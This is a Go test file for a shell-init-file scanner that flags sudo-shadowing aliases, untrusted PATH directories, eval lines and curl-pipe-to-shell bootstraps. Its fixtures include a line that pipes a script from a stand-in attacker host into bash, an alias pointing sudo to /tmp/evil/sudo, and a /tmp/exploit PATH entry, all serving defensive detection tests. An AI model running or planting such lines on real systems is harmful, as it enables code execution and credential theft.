package shellinit

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestPinnedEnumStrings(t *testing.T) {
	pairs := []struct{ got, want string }{
		{string(ShellBash), "bash"},
		{string(ShellZsh), "zsh"},
		{string(ShellFish), "fish"},
		{string(ShellSh), "sh"},
		{string(ShellDash), "dash"},
		{string(ShellCsh), "csh"},
		{string(ShellTcsh), "tcsh"},
		{string(ShellKsh), "ksh"},
		{string(ShellPowerShell), "powershell"},
		{string(ShellUnknown), "unknown"},
		{string(ScopeSystem), "system"},
		{string(ScopeUser), "user"},
		{string(RoleRC), "rc"},
		{string(RoleProfile), "profile"},
		{string(RoleLogin), "login"},
		{string(RoleLogout), "logout"},
		{string(RoleEnv), "env"},
		{string(RoleDropIn), "drop-in"},
		{string(RoleUnknown), "unknown"},
	}
	for _, p := range pairs {
		if p.got != p.want {
			t.Fatalf("enum drift: got %q want %q (breaks SQLite CHECK)",
				p.got, p.want)
		}
	}
}

func TestEncodeMapEmpty(t *testing.T) {
	if got := EncodeMap(nil); got != "{}" {
		t.Fatalf("nil = %q", got)
	}
}

func TestEncodeStringListEmpty(t *testing.T) {
	if got := EncodeStringList(nil); got != "[]" {
		t.Fatalf("nil = %q", got)
	}
}

func TestHashContentsDeterministic(t *testing.T) {
	a := HashContents([]byte("alias ls='ls --color'\n"))
	b := HashContents([]byte("alias ls='ls --color'\n"))
	if a != b {
		t.Fatal("not deterministic")
	}
	if len(a) != 64 {
		t.Fatalf("expected sha256 hex, got %d chars", len(a))
	}
	if HashContents([]byte("a")) == HashContents([]byte("b")) {
		t.Fatal("different inputs must hash differently")
	}
}

func TestIsShadowedBinary(t *testing.T) {
	for _, n := range []string{"ls", "sudo", "ssh", "git", "kubectl"} {
		if !IsShadowedBinary(n) {
			t.Fatalf("%q must be a shadowed binary", n)
		}
	}
	for _, n := range []string{"", "mything", "neofetch", "alias"} {
		if IsShadowedBinary(n) {
			t.Fatalf("%q must NOT be a shadowed binary", n)
		}
	}
}

func TestIsUntrustedPathDir(t *testing.T) {
	for _, d := range []string{
		"/tmp", "/tmp/", "/tmp/foo", "/var/tmp/x",
		"/dev/shm", "/dev/shm/exploit", ".",
	} {
		if !IsUntrustedPathDir(d) {
			t.Fatalf("%q must be untrusted", d)
		}
	}
	for _, d := range []string{"/usr/bin", "/usr/local/bin", "/home/alice/bin", ""} {
		if IsUntrustedPathDir(d) {
			t.Fatalf("%q must NOT be untrusted", d)
		}
	}
}

// -- parser ----------------------------------------------------------

func TestStripComment(t *testing.T) {
	cases := map[string]string{
		"echo hi":                        "echo hi",
		"echo hi # trailing":             "echo hi ",
		"# whole-line comment":           "",
		`alias x='foo # not a comment'`:  `alias x='foo # not a comment'`,
		`alias x="foo # also not"`:       `alias x="foo # also not"`,
		`mix 'q' # but this is':comment`: `mix 'q' `,
	}
	for in, want := range cases {
		if got := stripComment(in); got != want {
			t.Fatalf("stripComment(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestMatchAlias(t *testing.T) {
	cases := []struct {
		line     string
		wantName string
		wantVal  string
		ok       bool
	}{
		{`alias ls='ls --color=auto'`, "ls", "ls --color=auto", true},
		{`alias ll="ls -lah"`, "ll", "ls -lah", true},
		{`alias rm=rm-i`, "rm", "rm-i", true},
		{`alias k='kubectl'`, "k", "kubectl", true},
		{`# alias not-real='x'`, "", "", false},
		{`echo hi`, "", "", false},
	}
	for _, tc := range cases {
		n, v, ok := matchAlias(tc.line)
		if ok != tc.ok {
			t.Fatalf("matchAlias(%q) ok=%v, want %v", tc.line, ok, tc.ok)
		}
		if ok && (n != tc.wantName || v != tc.wantVal) {
			t.Fatalf("matchAlias(%q) = (%q, %q), want (%q, %q)",
				tc.line, n, v, tc.wantName, tc.wantVal)
		}
	}
}

func TestMatchExport(t *testing.T) {
	n, v, ok := matchExport(`export EDITOR=vim`)
	if !ok || n != "EDITOR" || v != "vim" {
		t.Fatalf("export EDITOR: (%q, %q, %v)", n, v, ok)
	}
	n, v, ok = matchExport(`export PATH="/usr/local/bin:$PATH"`)
	if !ok || n != "PATH" || !strings.Contains(v, "/usr/local/bin") {
		t.Fatalf("export PATH: (%q, %q, %v)", n, v, ok)
	}
	n, _, ok = matchExport(`FOO=bar`)
	if !ok || n != "FOO" {
		t.Fatalf("bare assignment: (%q, ok=%v)", n, ok)
	}
	_, _, ok = matchExport(`echo no assignment`)
	if ok {
		t.Fatal("non-assignment must not match")
	}
}

func TestMatchSource(t *testing.T) {
	cases := map[string]string{
		`source /etc/profile.d/x.sh`: "/etc/profile.d/x.sh",
		`. ~/.bashrc-local`:          "~/.bashrc-local",
		`source "/path with spaces"`: `"/path`, // best-effort — first whitespace token
		`echo no source`:             "",
	}
	for line, want := range cases {
		got, ok := matchSource(line)
		if want == "" {
			if ok {
				t.Fatalf("matchSource(%q) should not match, got %q", line, got)
			}
			continue
		}
		if !ok || got != want {
			t.Fatalf("matchSource(%q) = (%q, %v), want (%q, true)",
				line, got, ok, want)
		}
	}
}

func TestMatchEval(t *testing.T) {
	yes := []string{
		`eval "$(starship init bash)"`,
		`eval $(ssh-agent)`,
		`if true; then eval x; fi`,
		`foo && eval bar`,
	}
	for _, l := range yes {
		if !matchEval(l) {
			t.Fatalf("%q must match eval", l)
		}
	}
	for _, l := range []string{`echo eval`, `# eval comment`} {
		if matchEval(l) {
			t.Fatalf("%q must NOT match eval", l)
		}
	}
}

func TestMatchCurlPipe(t *testing.T) {
	yes := []string{
		`curl -sSL https://example/install.sh | sh`,
		`wget -qO- https://example/x | bash`,
		`curl https://x.com | bash -s -- --quiet`,
	}
	for _, l := range yes {
		if !matchCurlPipe(l) {
			t.Fatalf("%q must match curl-pipe", l)
		}
	}
	no := []string{
		`curl https://example`,
		`wget -O file.tar`,
		`echo curl x | sh`,
	}
	for _, l := range no {
		if matchCurlPipe(l) {
			t.Fatalf("%q must NOT match curl-pipe", l)
		}
	}
}

func TestExtractPathPrepends(t *testing.T) {
	got := extractPathPrepends(`"/home/me/bin:/tmp/exploit:$PATH"`)
	want := []string{"/home/me/bin", "/tmp/exploit"}
	if len(got) != 2 {
		t.Fatalf("got %v, want %v", got, want)
	}
	for i := range got {
		if got[i] != want[i] {
			t.Fatalf("pos %d: got %q, want %q", i, got[i], want[i])
		}
	}
}

func TestParseRealisticBashrcDetectsAllSignals(t *testing.T) {
	raw := []byte(`# user bashrc
# Aliases
alias ls='ls --color=auto'
alias sudo='/tmp/evil/sudo'        # shadow alias of sudo
alias mygrep='grep -i'             # not shadowed (mygrep is novel)

# Exports
export EDITOR=vim
export PATH="$HOME/bin:/tmp/exploit:/usr/local/bin:$PATH"

# Source another file
source /etc/profile.d/work.sh
. ~/.bash_aliases-extra

# Eval bootstrap from a tool
eval "$(starship init bash)"

# Untrusted bootstrap
curl -sSL https://attacker.example/install.sh | bash
`)
	got := Parse(raw)

	// Aliases.
	if len(got.Aliases) != 3 {
		t.Fatalf("aliases=%v", got.Aliases)
	}
	if got.Aliases["sudo"] != "/tmp/evil/sudo" {
		t.Fatalf("sudo alias lost: %q", got.Aliases["sudo"])
	}
	if !got.HasShadowAlias {
		t.Fatal("sudo alias must trigger has_shadow_alias")
	}

	// Exports + PATH.
	if got.Exports["EDITOR"] != "vim" {
		t.Fatalf("EDITOR=%q", got.Exports["EDITOR"])
	}
	if _, ok := got.Exports["PATH"]; ok {
		t.Fatal("PATH should be split out, not in exports map")
	}
	if !got.HasUntrustedPath {
		t.Fatal("/tmp/exploit prepend must trigger has_untrusted_path")
	}
	if len(got.PathPrepends) < 2 {
		t.Fatalf("path prepends=%v", got.PathPrepends)
	}

	// Source statements.
	if len(got.SourcedFiles) != 2 {
		t.Fatalf("sourced files=%v", got.SourcedFiles)
	}

	// Eval + curl-pipe.
	if !got.ContainsEval {
		t.Fatal("eval line must trigger contains_eval")
	}
	if !got.ContainsCurlPipe {
		t.Fatal("curl|bash must trigger contains_curl_pipe")
	}

	// Hash + size present.
	if got.FileHash == "" || got.FileSizeBytes != len(raw) {
		t.Fatalf("hash/size lost: %+v", got)
	}
}

func TestParseRejectsCommentedHazards(t *testing.T) {
	// All hazards live in comments — none must trigger.
	raw := []byte(`# alias sudo='evil'
# eval "$(x)"
# curl x | bash
# export PATH=/tmp:$PATH
echo "all good"
`)
	got := Parse(raw)
	if got.HasShadowAlias {
		t.Fatal("commented alias must not flag")
	}
	if got.ContainsEval {
		t.Fatal("commented eval must not flag")
	}
	if got.ContainsCurlPipe {
		t.Fatal("commented curl|bash must not flag")
	}
	if got.HasUntrustedPath {
		t.Fatal("commented PATH must not flag")
	}
}

// -- end-to-end collector --------------------------------------------

func TestFileCollectorWalksUserAndSystem(t *testing.T) {
	tmp := t.TempDir()
	aliceHome := filepath.Join(tmp, "home", "alice")
	systemEtc := filepath.Join(tmp, "etc")
	dropIn := filepath.Join(systemEtc, "profile.d")

	mustMkdir(t, aliceHome)
	mustMkdir(t, systemEtc)
	mustMkdir(t, dropIn)

	mustWrite(t, filepath.Join(aliceHome, ".bashrc"),
		`alias sudo='/tmp/x'`+"\nexport EDITOR=vim\n")
	mustWrite(t, filepath.Join(aliceHome, ".zshrc"),
		`source /usr/local/share/zsh/site-functions/_foo`+"\n")
	mustWrite(t, filepath.Join(systemEtc, "profile"),
		`export PATH=/usr/bin:/usr/local/bin:$PATH`+"\n")
	mustWrite(t, filepath.Join(dropIn, "lang.sh"),
		`export LANG=en_US.UTF-8`+"\n")
	mustWrite(t, filepath.Join(dropIn, "README"),
		`not parsed`+"\n")

	c := &fileCollector{
		homeRoots: []string{filepath.Join(tmp, "home")},
		systemFiles: []systemInit{
			{filepath.Join(systemEtc, "profile"), ShellSh, RoleProfile},
		},
		dropInDirs: []dropInDir{
			{filepath.Join(systemEtc, "profile.d"), ShellSh, []string{".sh"}},
		},
		readFile: os.ReadFile,
		readDir:  os.ReadDir,
	}
	got, err := c.Collect(context.Background())
	if err != nil {
		t.Fatalf("Collect: %v", err)
	}
	// 2 user files (alice's .bashrc + .zshrc) + 1 system profile +
	// 1 drop-in lang.sh (README skipped) = 4.
	if len(got) != 4 {
		t.Fatalf("want 4 files, got %d: %+v", len(got), got)
	}

	by := map[string]InitFile{}
	for _, f := range got {
		by[filepath.Base(f.FilePath)] = f
	}

	bashrc := by[".bashrc"]
	if bashrc.OwnerUser != "alice" || bashrc.Scope != ScopeUser ||
		bashrc.Shell != ShellBash || bashrc.FileRole != RoleRC {
		t.Fatalf("bashrc metadata wrong: %+v", bashrc)
	}
	if !bashrc.HasShadowAlias {
		t.Fatal("bashrc must flag shadow alias")
	}

	zshrc := by[".zshrc"]
	if zshrc.Shell != ShellZsh {
		t.Fatalf("zshrc shell=%q", zshrc.Shell)
	}
	if len(zshrc.SourcedFiles) != 1 {
		t.Fatalf("zshrc sourced files=%v", zshrc.SourcedFiles)
	}

	profile := by["profile"]
	if profile.Scope != ScopeSystem || profile.FileRole != RoleProfile {
		t.Fatalf("profile metadata wrong: %+v", profile)
	}

	drop := by["lang.sh"]
	if drop.FileRole != RoleDropIn {
		t.Fatalf("drop-in role=%q, want drop-in", drop.FileRole)
	}
}

func TestFileCollectorSkipsSystemUserHomes(t *testing.T) {
	tmp := t.TempDir()
	guestHome := filepath.Join(tmp, "Guest")
	mustMkdir(t, guestHome)
	mustWrite(t, filepath.Join(guestHome, ".bashrc"),
		`alias sudo='/tmp/x'`+"\n")
	c := &fileCollector{
		homeRoots: []string{tmp},
		readFile:  os.ReadFile,
		readDir:   os.ReadDir,
	}
	got, err := c.Collect(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range got {
		if f.OwnerUser == "Guest" {
			t.Fatal("Guest home must be skipped")
		}
	}
}

func TestSortInitFilesDeterministic(t *testing.T) {
	in := []InitFile{
		{Scope: ScopeUser, FilePath: "/home/z/.bashrc"},
		{Scope: ScopeSystem, FilePath: "/etc/profile"},
		{Scope: ScopeUser, FilePath: "/home/a/.bashrc"},
	}
	SortInitFiles(in)
	if in[0].Scope != ScopeSystem {
		t.Fatalf("system must sort first, got %+v", in[0])
	}
	if in[1].FilePath != "/home/a/.bashrc" || in[2].FilePath != "/home/z/.bashrc" {
		t.Fatalf("user sort: %+v %+v", in[1], in[2])
	}
}

// -- helpers ---------------------------------------------------------

func mustMkdir(t *testing.T, p string) {
	t.Helper()
	if err := os.MkdirAll(p, 0o755); err != nil {
		t.Fatal(err)
	}
}

func mustWrite(t *testing.T, p, body string) {
	t.Helper()
	if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}
